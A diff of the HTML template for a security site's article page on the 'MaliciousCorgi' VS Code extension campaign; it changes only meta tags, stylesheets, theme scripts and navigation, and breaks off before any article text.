@@ -3,37 +3,31 @@
 
 <head>
     <meta charset="UTF-8">
-    
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
 
-    <title>Malware Analysis: inside the 'MaliciousCorgi' VS Code Attack | TheHGTech [2026]</title>
-
-    <!-- Twitter Card -->
-    <meta name="twitter:title" content="Malware Analysis: inside the 'MaliciousCorgi' VS Code Attack | TheHGTech">
-    <meta name="twitter:description" content="Technical analysis of the MaliciousCorgi campaign. How fake VS Code extensions infected 100,000 developers, bypassed Marketplace security with WASM, and stole AWS secrets.">
-    <meta name="twitter:image" content="https://thehgtech.com/images/articles/vscode-malicious-extensions-2026.png">
-
-    <!-- Open Graph -->
-    <meta property="og:site_name" content="TheHGTech">
-    <meta name="description"
-        content="Technical analysis of the MaliciousCorgi campaign. How fake VS Code extensions infected 100,000 developers, bypassed Marketplace security with WASM, and stole AWS secrets.">
-    <meta name="keywords"
-        content="VS Code Malware, MaliciousCorgi, Supply Chain Attack, WASM Obfuscation, Developer Security, Cyber Attack 2026, Reverse Engineering">
+    <!-- Preserved Production SEO Meta Tags & Canonical URL -->
+    <title>Malware Analysis: inside the &#x27;MaliciousCorgi&#x27; VS Code Attack | TheHGTech</title>
+    <meta name="description" content="Technical analysis of the MaliciousCorgi campaign. How fake VS Code extensions infected 100,000 developers, bypassed Marketplace security with WASM, and stole AWS secrets.">
+    <meta name="keywords" content="VS Code Malware, MaliciousCorgi, Supply Chain Attack, WASM Obfuscation, Developer Security, Cyber Attack 2026, Reverse Engineering">
     <meta name="author" content="TheHGTech Security Team">
+    <meta name="robots" content="index, follow">
     <link rel="canonical" href="https://thehgtech.com/articles/vscode-malicious-extensions-supply-chain-2026.html">
 
     <!-- Open Graph -->
     <meta property="og:type" content="article">
     <meta property="og:url" content="https://thehgtech.com/articles/vscode-malicious-extensions-supply-chain-2026.html">
-    <meta property="og:title" content="The 'MaliciousCorgi' VS Code Attack Analysis">
-    <meta property="og:description"
-        content="100k infected. Zero detections. How a cute Corgi extension hid a sophisticated Go-based stealer inside WebAssembly.">
+    <meta property="og:title" content="Malware Analysis: inside the &#x27;MaliciousCorgi&#x27; VS Code Attack">
+    <meta property="og:description" content="Technical analysis of the MaliciousCorgi campaign. How fake VS Code extensions infected 100,000 developers, bypassed Marketplace security with WASM, and stole AWS secrets.">
     <meta property="og:image" content="https://thehgtech.com/images/articles/vscode-malicious-extensions-2026.png">
+    <meta property="og:site_name" content="TheHGTech">
 
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Malware Analysis: inside the &#x27;MaliciousCorgi&#x27; VS Code Attack">
+    <meta name="twitter:description" content="Technical analysis of the MaliciousCorgi campaign. How fake VS Code extensions infected 100,000 developers, bypassed Marketplace security with WASM, and stole AWS secrets.">
+    <meta name="twitter:image" content="https://thehgtech.com/images/articles/vscode-malicious-extensions-2026.png">
 
-    <!-- Schema.org Breadcrumbs -->
+    <!-- Preserved Structured Data (TechArticle, NewsArticle, Breadcrumbs, etc.) -->
     <script type="application/ld+json">
     {
       "@context": "https://schema.org",
@@ -56,228 +50,6 @@
       }]
     }
     </script>
-
-    <!-- Fonts & Icons -->
-    <link rel="preload" href="/fonts/inter-variable.woff2" as="font" type="font/woff2" crossorigin>
-    <link rel="stylesheet" href="/fonts.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer">
-
-    <!-- Core CSS -->
-    <link rel="stylesheet" href="../m-core.css?v=4.2">
-    <link rel="stylesheet" href="../m-layout.css?v=3.4">
-    <link rel="stylesheet" href="../m-components.css?v=3.0">
-    <link rel="stylesheet" href="../light-mode.css">
-    <link rel="stylesheet" href="../interaction-bar.css?v=20251207">
-
-    <script src="../m-app.js?v=20260528_coffee" defer></script>
-    <script src="../interaction-bar.js?v=20260605" defer></script>
-
-    <style>
-        :root {
-            --bg-primary: #1e1e1e;
-            /* VS Code Dark Theme BG */
-            --bg-secondary: #252526;
-            --text-primary: #d4d4d4;
-            --text-blue: #569cd6;
-            --text-green: #6a9955;
-            --text-orange: #ce9178;
-            --accent-purple: #c586c0;
-            --border: #3c3c3c;
-        }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background: var(--bg-primary);
-            color: var(--text-primary);
-            line-height: 1.8;
-        }
-
-        .article-container {
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 80px 1.5rem 120px;
-        }
-
-        .article-header {
-            margin-bottom: 3rem;
-            padding-bottom: 1.5rem;
-            border-bottom: 1px solid var(--border);
-        }
-
-        .article-header h1 {
-            font-size: clamp(2rem, 4vw, 3rem);
-            color: #fff;
-            margin-bottom: 1rem;
-            line-height: 1.2;
-            font-weight: 700;
-        }
-
-        .article-meta {
-            color: #858585;
-            font-size: 0.9rem;
-            display: flex;
-            gap: 1.5rem;
-            flex-wrap: wrap;
-            align-items: center;
-            font-family: 'Fira Code', monospace;
-        }
-
-        .tag-badge {
-            background: #0e639c;
-            color: #fff;
-            padding: 2px 8px;
-            border-radius: 2px;
-            font-size: 0.8rem;
-        }
-
-        .article-featured-image {
-            width: 100%;
-            border-radius: 6px;
-            margin-bottom: 2.5rem;
-            border: 1px solid var(--border);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-        }
-
-        /* IDE Style Content */
-        .article-content {
-            counter-reset: line;
-        }
-
-        .article-content h2 {
-            margin: 3rem 0 1.5rem;
-            color: var(--text-blue);
-            font-size: 1.75rem;
-            font-weight: 600;
-            font-family: 'Fira Code', monospace;
-        }
-
-        .article-content h3 {
-            margin: 2rem 0 1rem;
-            color: var(--accent-purple);
-            font-size: 1.4rem;
-            font-weight: 500;
-            font-family: 'Fira Code', monospace;
-        }
-
-        .article-content p {
-            margin-bottom: 1.5rem;
-            font-size: 1.1rem;
-        }
-
-        /* Code Blocks - VS Code Theme */
-        .code-window {
-            background: #1e1e1e;
-            border: 1px solid #333;
-            border-radius: 6px;
-            margin: 2.5rem 0;
-            overflow: hidden;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
-        }
-
-        .code-header {
-            background: #252526;
-            padding: 0.5rem 1rem;
-            font-family: 'Fira Code', monospace;
-            font-size: 0.85rem;
-            color: #ccc;
-            border-bottom: 1px solid #333;
-            display: flex;
-            justify-content: space-between;
-        }
-
-        .code-body {
-            padding: 1rem;
-            overflow-x: auto;
-        }
-
-        pre {
-            margin: 0;
-            font-family: 'Fira Code', monospace;
-            font-size: 0.9rem;
-            line-height: 1.5;
-        }
-
-        .token-keyword {
-            color: var(--text-blue);
-        }
-
-        .token-string {
-            color: var(--text-orange);
-        }
-
-        .token-comment {
-            color: var(--text-green);
-            font-style: italic;
-        }
-
-        .token-func {
-            color: #dcdcaa;
-        }
-
-        .token-var {
-            color: #9cdcfe;
-        }
-
-        .ioc-table {
-            width: 100%;
-            border-collapse: collapse;
-            font-family: 'Fira Code', monospace;
-            font-size: 0.85rem;
-            margin: 2rem 0;
-            background: #252526;
-        }
-
-        .ioc-table th,
-        .ioc-table td {
-            padding: 0.75rem;
-            border: 1px solid #3c3c3c;
-            text-align: left;
-        }
-
-        .ioc-table th {
-            background: #333;
-            color: #fff;
-        }
-
-        .warning-alert {
-            background: rgba(255, 61, 61, 0.1);
-            border-left: 4px solid #f44336;
-            padding: 1.5rem;
-            margin: 2rem 0;
-        }
-    </style>
-<link rel="stylesheet" href="../ui-enhancements.css?v=3.5_newsletter">
-
-    <!-- ========== GLOBAL THEME SCRIPT ========== -->
-    <script>
-        // Inline theme set to avoid FOUC
-        (function() {
-            var savedTheme = localStorage.getItem("theme");
-            if (savedTheme === "light" || (!savedTheme && window.matchMedia("(prefers-color-scheme: light)").matches)) {
-                document.documentElement.setAttribute("data-theme", "light");
-                document.body.classList.add("light-mode");
-            }
-        })();
-    </script>
-    <!-- Google Analytics 4 -->
-        <script async src="https://www.googletagmanager.com/gtag/js?id=G-XL6RCXZJE2"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag() { dataLayer.push(arguments); }
-        gtag('js', new Date());
-        gtag('config', 'G-XL6RCXZJE2');
-    </script>
-        <!-- Fullres Analytics -->
-    <script>
-        (function () {
-            var fullres = document.createElement('script');
-            fullres.async = true;
-            fullres.src = 'https://t.fullres.net/thehgtech.js?' + (new Date() - new Date() % 43200000);
-            document.head.appendChild(fullres);
-        })();
-    </script>
-
-    <!-- Advanced Rich Snippet Injection -->
     <script type="application/ld+json">
     {
       "@context": "https://schema.org",
@@ -299,13 +71,6 @@
       }]
     }
     </script>
-    <link rel="stylesheet" href="/mobile-nav.css">
-
-    <script src="/theme-toggle.js" defer></script>
-    
-    
-
-    <!-- SEO: NewsArticle Schema -->
     <script type="application/ld+json">
 {
   "@context": "https://schema.org",
@@ -344,62 +109,403 @@
   "articleSection": "AI Security"
 }
 </script>
+
+    <!-- Approved Brand Identity Favicon & App Icons -->
+    <link rel="icon" href="/assets/brand/favicon/favicon.ico" sizes="any">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/brand/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/brand/favicon/favicon-16x16.png">
+    <link rel="apple-touch-icon" href="/assets/brand/favicon/apple-touch-icon.png">
+
+    <!-- Preload Critical Fonts -->
+    <link rel="preload" href="/fonts/inter-v18-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="/fonts/inter-v18-latin-600.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="/fonts/inter-v18-latin-700.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="/fonts/jetbrains-mono-v21-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="stylesheet" href="/fonts.css">
+
+    <!-- Canonical Site Chrome & Unified Editorial Article Stylesheet -->
+    <link rel="stylesheet" href="/header.css">
+    <link rel="stylesheet" href="/header-dropdown.min.css?v=1">
+    <link rel="stylesheet" href="/light-mode.css">
+    <link rel="stylesheet" href="/theme-toggle.css">
+    <link rel="stylesheet" href="/command-palette.css">
+    <link rel="stylesheet" href="/m-core.min.css?v=4.4">
+    <link rel="stylesheet" href="/m-layout.min.css?v=3.4">
+    <link rel="stylesheet" href="/m-components.min.css?v=3.0">
+    <link rel="stylesheet" href="/mobile-nav.css">
+    <link rel="stylesheet" href="/print.css">
+    <link rel="stylesheet" href="/css/article-editorial.css?v=1.0">
+
+    <!-- Non-blocking FontAwesome & Interaction Bar Stylesheet -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="stylesheet" href="/interaction-bar.css?v=20251207-0041">
+
+    <!-- Pre-render Theme Initialization -->
+    <script>
+        (function () {
+            try {
+                var params = new URLSearchParams(window.location.search);
+                var forced = params.get("theme");
+                var saved = localStorage.getItem("theme");
+                var mode = (forced === "light" || forced === "dark") ? forced : saved;
+                if (mode === "light") {
+                    document.documentElement.setAttribute("data-theme", "light");
+                    document.addEventListener("DOMContentLoaded", function () {
+                        document.body.classList.add("light-mode");
+                    });
+                } else if (forced === "dark") {
+                    document.documentElement.removeAttribute("data-theme");
+                }
+            } catch (e) {}
+        })();
+    </script>
 </head>
 
-<body>
-    <!-- SEO Breadcrumb Navigation -->
-    <nav aria-label="Breadcrumb" style="padding: 0.75rem 1.5rem; font-size: 0.875rem; color: #a0a5b8; background: var(--bg-secondary, #080810);">
-      <ol style="list-style:none; padding:0; margin:0; display:flex; gap:0.5rem; flex-wrap:wrap; align-items:center; max-width:1400px; margin:0 auto;">
-        <li><a href="/" style="color:#a0a5b8; text-decoration:none;" rel="home">Home</a></li>
-        <li style="color:#6b7084;" aria-hidden="true">›</li>
-        <li><a href="/articles.html" style="color:#a0a5b8; text-decoration:none;">Articles</a></li>
-        <li style="color:#6b7084;" aria-hidden="true">›</li>
-        <li style="color:#ffffff;" aria-current="page">Malware Analysis: inside the 'MaliciousCorgi' VS C…</li>
-      </ol>
-    </nav>
-    <!-- Mobile Header -->
+<body class="article-pilot">
+    <a href="#main-content" class="ap-skip-link">Skip to Article Content</a>
 
+    <!-- Native CSS Scroll-Driven Reading Progress Indicator -->
+    <div id="progress" class="ap-reading-progress" aria-hidden="true"></div>
 
-
-</div>
-
-    <div class="article-container">
-        <!-- Breadcrumb -->
-        <div style="font-size: 0.85rem; color: #888; margin-bottom: 1.5rem; font-family: 'Fira Code', monospace;">
-            > cd /articles/malware-analysis/<br>
-            > cat maliciouscorgi-campaign.md
+    <!-- Mobile Canonical Header -->
+    <header class="m-header m-only">
+        <div class="m-header__logo">
+            <a href="/" style="display: flex; align-items: center; gap: 0.75rem; text-decoration: none;">
+                <img src="/assets/brand/svg/hg-symbol.svg" alt="TheHGTech" class="m-logo-img logo-dark" style="height: 28px; width: auto; margin: 0;">
+                <img src="/assets/brand/svg/hg-symbol-light.svg" alt="TheHGTech" class="m-logo-img logo-light" style="height: 28px; width: auto; margin: 0; display: none;">
+                <span class="logo-text" style="font-size: 1.25rem;"><span class="logo-text-base">The</span><span class="logo-text-red">HG</span><span class="logo-text-base">Tech</span></span>
+            </a>
         </div>
+        <div class="m-header__actions">
+            <button class="m-header__btn" id="m-theme-toggle-top" onclick="window.togglePilotTheme();" aria-label="Toggle Theme">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+            </button>
+            <button class="m-header__btn" data-action="command-palette" aria-label="Search">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+            </button>
+            <button class="m-header__btn" id="m-hamburger-btn" aria-label="Menu">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+            </button>
+        </div>
+    </header>
 
-        <section class="article-header">
-            <div style="display: flex; gap: 10px; margin-bottom: 1rem;">
-                <span class="tag-badge">ALERT</span>
-                <span class="tag-badge" style="background: #be1100;">CRITICAL</span>
-                <span class="tag-badge" style="background: #3a3d41;">TECHNICAL</span>
+    <!-- Fullscreen Mobile Menu Overlay -->
+    <div class="m-menu-overlay m-only" id="m-menu-overlay">
+        <div class="m-menu-header">
+            <span style="font-size: 1.15rem; font-weight: 700;">Navigation</span>
+            <button class="m-menu-close" id="m-menu-close-btn" aria-label="Close Menu">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6 6 18M6 6l12 12"/></svg>
+            </button>
+        </div>
+        <div class="m-menu-content">
+            <div class="m-menu-section">
+                <div class="m-menu-title">Intelligence</div>
+                <a href="/threat-intel.html" class="m-menu-link">Threat Intel</a>
+                <a href="/cve-tracker.html" class="m-menu-link">CVE Tracker</a>
+                <a href="/hacker-chatter.html" class="m-menu-link">Hacker Chatter</a>
+                <a href="/ransomware-tracker.html" class="m-menu-link">Ransomware</a>
             </div>
-            <h1>Malware Analysis: The 'MaliciousCorgi' VS Code Attack</h1>
-            <p style="font-size: 1.25rem; line-height: 1.6; color: #ccc;">How a cluster of innocent-looking "AI
-                Assistant" extensions compromised 100,000 developer machines, evaded detection for weeks using WASM
-                obfuscation, and stole the source code of major fintech firms.</p>
-            <div class="article-meta">
-                <span><i class="fas fa-user"></i> <a href="/about.html#harish-g" rel="author" style="color:inherit; text-decoration:none;">Harish G</a></span>
-                <span><i class="fas fa-user-ninja"></i> Reverse Engineered by TheHGTech Labs</span>
-                <span><i class="far fa-calendar-alt"></i> Jan 30, 2026</span>
-                <span><i class="fas fa-stopwatch"></i> 20 min read</span>
+            <div class="m-menu-section">
+                <div class="m-menu-title">Resources</div>
+                <a href="/articles.html" class="m-menu-link">Research Library (Articles)</a>
+                <a href="/guides/" class="m-menu-link">Security Guides</a>
+                <a href="/comparisons/" class="m-menu-link">Tool Comparisons</a>
             </div>
-        </section>
+            <div class="m-menu-section">
+                <div class="m-menu-title">Tools</div>
+                <a href="/tools/grc-assessment/" class="m-menu-link">GRC Assessment</a>
+                <a href="/workflows/" class="m-menu-link">n8n Workflows</a>
+            </div>
+            <div class="m-menu-section">
+                <div class="m-menu-title">Settings</div>
+                <button class="m-menu-theme-btn" onclick="window.togglePilotTheme(); if(typeof updateMenuThemeLabel === 'function') updateMenuThemeLabel();">
+                    <span id="m-menu-theme-text">Toggle Reading Theme</span>
+                </button>
+            </div>
+        </div>
+    </div>
 
-        <img src="../images/articles/vscode-malicious-extensions-2026.png" alt="Malicious VS Code Extensions Analysis"
-            class="article-featured-image" loading="lazy">
+    <!-- Mobile Search Overlay -->
+    <div class="m-search-overlay m-only">
+        <div class="m-search-overlay__header">
+            <input type="text" class="m-search-overlay__input" placeholder="Search news, CVEs, guides..." aria-label="Search site">
+            <button class="m-search-overlay__cancel">Cancel</button>
+        </div>
+        <div class="m-search-overlay__results"></div>
+    </div>
 
-        <article class="article-content">
-        <!-- Mobile Back Button -->
-        <a href="/articles.html" class="back-link" style="display: inline-flex; align-items: center; gap: 8px; color: var(--accent-cyan, #00D9FF); text-decoration: none; font-weight: 600; margin-bottom: 1.5rem; font-size: 0.95rem; background: rgba(0, 217, 255, 0.1); padding: 8px 16px; border-radius: 20px; border: 1px solid rgba(0, 217, 255, 0.2);">
-            <i class="fas fa-arrow-left"></i> Back to Articles
-        </a>
+    <!-- Desktop Canonical Header -->
+    <header class="header" role="banner">
+        <div class="header-content">
+            <div class="logo">
+                <a href="/" style="text-decoration: none; display: flex; align-items: center; gap: 0.75rem;">
+                    <img src="/assets/brand/svg/hg-symbol.svg" alt="TheHGTech Logo" class="logo-img logo-dark" width="33" height="40">
+                    <img src="/assets/brand/svg/hg-symbol-light.svg" alt="TheHGTech Logo" class="logo-img logo-light" width="33" height="40">
+                    <span class="logo-text"><span class="logo-text-base">The</span><span class="logo-text-red">HG</span><span class="logo-text-base">Tech</span></span>
+                </a>
+            </div>
+
+            <nav class="nav nav-modern" role="navigation" aria-label="Primary Navigation">
+                <a href="/">Home</a>
+
+                <div class="nav-dropdown">
+                    <span class="nav-dropdown-trigger">
+                        Intelligence
+                        <span class="nav-live-badge">LIVE</span>
+                        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-left:3px;" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+                    </span>
+                    <div class="nav-dropdown-panel">
+                        <a href="/threat-intel.html" class="dropdown-item">
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Threat Intelligence <span class="dropdown-badge live">LIVE</span></div>
+                                <div class="dropdown-item-desc">Live IOCs from 9 trusted feeds, updated every 4 hours</div>
+                            </div>
+                        </a>
+                        <a href="/cve-tracker.html" class="dropdown-item">
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">CVE Tracker</div>
+                                <div class="dropdown-item-desc">CISA KEV + NVD critical vulnerabilities with EPSS scores</div>
+                            </div>
+                        </a>
+                        <a href="/ransomware-tracker.html" class="dropdown-item">
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Ransomware Tracker</div>
+                                <div class="dropdown-item-desc">Track active ransomware groups and victims</div>
+                            </div>
+                        </a>
+                        <a href="/hacker-chatter.html" class="dropdown-item">
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Hacker Chatter <span class="dropdown-badge">NEW</span></div>
+                                <div class="dropdown-item-desc">Searchable data breach &amp; cyber incident database</div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+
+                <div class="nav-dropdown">
+                    <span class="nav-dropdown-trigger">
+                        Resources
+                        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-left:3px;" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+                    </span>
+                    <div class="nav-dropdown-panel">
+                        <a href="/articles.html" class="dropdown-item">
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Research Library <span class="dropdown-badge popular">197+</span></div>
+                                <div class="dropdown-item-desc">Security research, vulnerability investigations &amp; threat reports</div>
+                            </div>
+                        </a>
+                        <a href="/guides/" class="dropdown-item">
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Security Guides <span class="dropdown-badge popular">40+</span></div>
+                                <div class="dropdown-item-desc">ISO 27001, NIST, SOC2, incident response &amp; detection manuals</div>
+                            </div>
+                        </a>
+                        <a href="/workflows/" class="dropdown-item">
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">n8n Workflows</div>
+                                <div class="dropdown-item-desc">Security automation templates</div>
+                            </div>
+                        </a>
+                        <a href="/comparisons/" class="dropdown-item">
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title">Tool Comparisons</div>
+                                <div class="dropdown-item-desc">EDR, SIEM, and security tool head-to-head reviews</div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+
+                <div class="nav-dropdown">
+                    <span class="nav-dropdown-trigger">
+                        Tools
+                        <span class="nav-live-badge" style="background: rgba(16, 185, 129, 0.2); color: #10B981; margin-left:4px;">NEW</span>
+                        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="margin-left:3px;" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+                    </span>
+                    <div class="nav-dropdown-panel" style="min-width: 240px;">
+                        <a href="/tools/grc-assessment/" class="dropdown-item">
+                            <div class="dropdown-item-content">
+                                <div class="dropdown-item-title" style="color: #10B981;">ISO 27001 GRC Tool</div>
+                                <div class="dropdown-item-desc">Interactive scope builder &amp; gap assessment</div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+
+                <a href="/about.html">About</a>
+
+                <div style="display: flex; gap: 10px; margin-left: 12px; border-left: 1px solid rgba(148,163,184,0.25); padding-left: 14px; align-items: center;">
+                    <a href="https://x.com/thehgtech" target="_blank" rel="noopener noreferrer" aria-label="Follow us on X" style="color: var(--ap-ink-secondary); display:inline-flex;">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+                    </a>
+                    <a href="https://linkedin.com/company/thehgtech" target="_blank" rel="noopener noreferrer" aria-label="Follow us on LinkedIn" style="color: var(--ap-ink-secondary); display:inline-flex;">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
+                    </a>
+                </div>
+
+                <button class="desktop-search-btn" data-action="command-palette" aria-label="Search" title="Search (Cmd+K)" style="margin-left: 14px; display: inline-flex; align-items: center; justify-content: center; width: 36px; height: 36px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255,255,255,0.12); border-radius: 50%; color: inherit; cursor: pointer;">
+                    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+                </button>
+                <button class="m-theme-toggle" id="themeToggle" onclick="window.togglePilotTheme()" aria-label="Toggle Theme" style="margin-left: 12px; display: inline-flex; position: relative; width: 54px; height: 28px; background: linear-gradient(135deg, #1a1a2e, #16213e); border: 1.5px solid rgba(255, 255, 255, 0.15); border-radius: 50px; cursor: pointer;">
+                    <span class="m-theme-toggle__thumb" style="position: absolute; top: 2px; left: 2px; width: 22px; height: 22px; background: linear-gradient(135deg, #c0c0c0, #e8e8e8); border-radius: 50%; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3); transition: all 0.3s ease;"></span>
+                </button>
+            </nav>
+
+            <button class="mobile-menu-btn" aria-label="Toggle menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+        </div>
+    </header>
+
+    <!-- Sticky Secondary Editorial Sub-Navigation & Reading Comfort Bar -->
+    <div class="ap-subnav-shell" role="region" aria-label="Article Navigation and Reading Controls">
+        <div class="ap-subnav-bar">
+            <div class="ap-subnav-left">
+                <a href="/articles.html" class="ap-back-library">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" aria-hidden="true"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                    <span>Research Library</span>
+                </a>
+                <span class="ap-series-tag">
+                    <span class="ap-series-dot" aria-hidden="true"></span>
+                    <span>THEHGTECH // SECURITY RESEARCH MONOGRAPH</span>
+                </span>
+            </div>
+            <div class="ap-reader-toolbar" role="group" aria-label="Reading comfort controls">
+                <button type="button" class="ap-reader-btn" data-scale="compact" onclick="window.setArticleReaderScale('compact')" aria-pressed="false" title="Compact font size">A-</button>
+                <button type="button" class="ap-reader-btn active" data-scale="default" onclick="window.setArticleReaderScale('default')" aria-pressed="true" title="Default font size">A</button>
+                <button type="button" class="ap-reader-btn" data-scale="large" onclick="window.setArticleReaderScale('large')" aria-pressed="false" title="Large font size">A+</button>
+                <span class="ap-toolbar-sep" aria-hidden="true"></span>
+                <button type="button" class="ap-reader-btn" onclick="window.togglePilotTheme()" aria-label="Switch reading surface theme">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 3a9 9 0 0 1 0 18z" fill="currentColor"/></svg>
+                    <span id="apThemeLabel">Paper</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <main id="main-content" class="ap-main">
+        <article itemscope itemtype="https://schema.org/NewsArticle">
+            <!-- Article Header & Metadata Ledger -->
+            <header class="ap-article-header">
+                <nav aria-label="Breadcrumb">
+                    <ol class="ap-breadcrumbs">
+                        <li><a href="/">Home</a></li>
+                        <li aria-hidden="true">/</li>
+                        <li><a href="/articles.html">Research Library</a></li>
+                        <li aria-hidden="true">/</li>
+                        <li aria-current="page">Supply Chain Attack</li>
+                    </ol>
+                </nav>
+
+                <div class="ap-kicker-row">
+                    <span class="ap-pill ap-pill-category">Supply Chain Attack</span>
+                    <span class="ap-pill">Independent Research</span>
+                    <span class="ap-pill ap-pill-emerald">Verified Analysis</span>
+                </div>
+
+                <h1 class="ap-title" itemprop="headline">Malware Analysis: inside the &#x27;MaliciousCorgi&#x27; VS Code Attack</h1>
+
+                <p class="ap-standfirst" itemprop="description">
+                    Technical analysis of the MaliciousCorgi campaign. How fake VS Code extensions infected 100,000 developers, bypassed Marketplace security with WASM, and stole AWS secrets.
+                </p>
+
+                <div class="ap-byline-ledger">
+                    <div class="ap-byline-author">
+                        <div class="ap-author-avatar" aria-hidden="true">TS</div>
+                        <div class="ap-byline-cell">
+                            <span class="ap-byline-label">Lead Author</span>
+                            <span class="ap-byline-val"><a href="/about.html" rel="author">TheHGTech Security Team</a></span>
+                            <span class="ap-byline-sub">TheHGTech Security Research Team</span>
+                        </div>
+                    </div>
+                    <div class="ap-byline-cell">
+                        <span class="ap-byline-label">Published</span>
+                        <time class="ap-byline-val" datetime="January 30, 2026" itemprop="datePublished">January 30, 2026</time>
+                        <span class="ap-byline-sub">Peer Reviewed &amp; Field Verified</span>
+                    </div>
+                    <div class="ap-byline-cell">
+                        <span class="ap-byline-label">Reading Scope</span>
+                        <span class="ap-byline-val">8 min read</span>
+                        <span class="ap-byline-sub">4 Technical Sections</span>
+                    </div>
+                    <div class="ap-share-cluster" role="group" aria-label="Share or print article">
+                        <button type="button" class="ap-icon-btn" onclick="window.sharePilotX(event)" aria-label="Share on X" title="Share on X">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+                        </button>
+                        <button type="button" class="ap-icon-btn" onclick="window.sharePilotLinkedIn(event)" aria-label="Share on LinkedIn" title="Share on LinkedIn">
